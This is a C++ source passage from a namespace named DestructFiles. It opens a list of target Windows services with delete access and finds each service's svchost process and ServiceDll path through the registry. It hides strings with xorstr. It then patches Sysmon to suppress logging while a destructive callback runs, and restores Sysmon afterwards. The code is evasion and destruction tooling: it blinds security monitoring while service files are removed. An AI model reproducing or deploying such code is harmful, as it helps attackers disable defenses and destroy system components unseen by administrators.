        for ( int ti = 0; targets[ ti ] && _Cb::entryCount < 16; ti++ ) {
            auto& e = _Cb::entries[ _Cb::entryCount ];
            wcsncpy_s( e.svcName, 256, targets[ ti ], _TRUNCATE );

            if ( hSCM ) {
                e.hSvc = OpenServiceW( hSCM, e.svcName, kFull );
                if ( !e.hSvc )
                    e.hSvc = OpenServiceW( hSCM, e.svcName, kDelete );

                if ( e.hSvc ) {
                    e.useSCM = true;
                    SERVICE_STATUS_PROCESS ssp    = {};
                    DWORD                  needed = 0;
                    if ( QueryServiceStatusEx( e.hSvc, SC_STATUS_PROCESS_INFO,
                                               reinterpret_cast<LPBYTE>( &ssp ),
                                               sizeof( ssp ), &needed ) )
                        e.svchostPid = ssp.dwProcessId;

                    if ( !e.svchostPid ) {
                        SC_HANDLE hQS = OpenServiceW( hSCM, e.svcName, SERVICE_QUERY_STATUS );
                        if ( hQS ) {
                            SERVICE_STATUS_PROCESS sspQ    = {};
                            DWORD                  neededQ = 0;
                            if ( QueryServiceStatusEx( hQS, SC_STATUS_PROCESS_INFO,
                                                       reinterpret_cast<LPBYTE>( &sspQ ),
                                                       sizeof( sspQ ), &neededQ ) )
                                e.svchostPid = sspQ.dwProcessId;
                            CloseServiceHandle( hQS );
                        }
                    }
                } else {
                    wchar_t testKey[ 520 ] = {};
                    wcsncpy_s( testKey, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
                    wcsncat_s( testKey, 520, e.svcName, _TRUNCATE );
                    HKEY hTest = nullptr;
                    bool exists = RegOpenKeyExW( HKEY_LOCAL_MACHINE, testKey,
                                                 0, KEY_READ, &hTest ) == ERROR_SUCCESS;
                    if ( hTest ) RegCloseKey( hTest );
                    if ( !exists ) {
                        memset( &e, 0, sizeof( e ) );
                        continue;
                    }
                }
            } else {
                wchar_t testKey[ 520 ] = {};
                wcsncpy_s( testKey, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
                wcsncat_s( testKey, 520, e.svcName, _TRUNCATE );
                HKEY hTest = nullptr;
                bool exists = RegOpenKeyExW( HKEY_LOCAL_MACHINE, testKey,
                                             0, KEY_READ, &hTest ) == ERROR_SUCCESS;
                if ( hTest ) RegCloseKey( hTest );
                if ( !exists ) {
                    memset( &e, 0, sizeof( e ) );
                    continue;
                }
            }

            if ( !e.svchostPid ) {
                wchar_t regPath[ 520 ] = {};
                wcsncpy_s( regPath, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
                wcsncat_s( regPath, 520, e.svcName,    _TRUNCATE );
                wcsncat_s( regPath, 520, L"\\Parameters", _TRUNCATE );
                HKEY hKey = nullptr;
                if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hKey ) == ERROR_SUCCESS ) {
                    wchar_t raw[ MAX_PATH * 2 ] = {};
                    DWORD   cb = sizeof( raw );
                    if ( RegQueryValueExW( hKey, xorstr( L"ServiceDll" ), nullptr, nullptr,
                                           reinterpret_cast<LPBYTE>( raw ), &cb ) == ERROR_SUCCESS
                         && raw[ 0 ] ) {
                        wchar_t* src = raw;
                        if ( src[ 0 ] == L'"' ) { src++; wchar_t* q = wcschr( src, L'"' ); if ( q ) *q = L'\0'; }
                        wchar_t exp[ MAX_PATH * 2 ] = {};
                        ExpandEnvironmentStringsW( src, exp, MAX_PATH * 2 );
                        wchar_t* base  = exp[ 0 ] ? exp : src;
                        wchar_t* fname = wcsrchr( base, L'\\' );
                        fname = fname ? fname + 1 : base;
                        if ( fname[ 0 ] ) e.svchostPid = _FindPidByModule( fname );
                    }
                    RegCloseKey( hKey );
                }
            }

            if ( !_ResolveDllPath( e.svcName, e.svchostPid, e.dllPath, MAX_PATH * 2 ) )
                _Cb::errFlags |= DERR_INIT_PATH;

            _Cb::entryCount++;
        }

        if ( hSCM ) CloseServiceHandle( hSCM );

        if ( _Cb::entryCount == 0 ) {
            _Cb::errFlags |= DERR_INIT | DERR_INIT_SVC;
            return false;
        }

        const DWORD kSysmonMaxMs = 5000;

        SysmonTool::Initialize( );
        bool sysmonPatched = SysmonTool::Patch( _PatchCallback );

        if ( sysmonPatched ) {
            for ( DWORD t = 0; !_Cb::done.load( ) && t < kSysmonMaxMs; t += 10 )
                Sleep( 10 );

            Sleep( 1000 );
            SysmonTool::Restore( );

            while ( !_Cb::done.load( ) )
                Sleep( 10 );
        } else {
            _PatchCallback( );
        }

        return _Cb::ok.load( );
    }

} // namespace DestructFiles
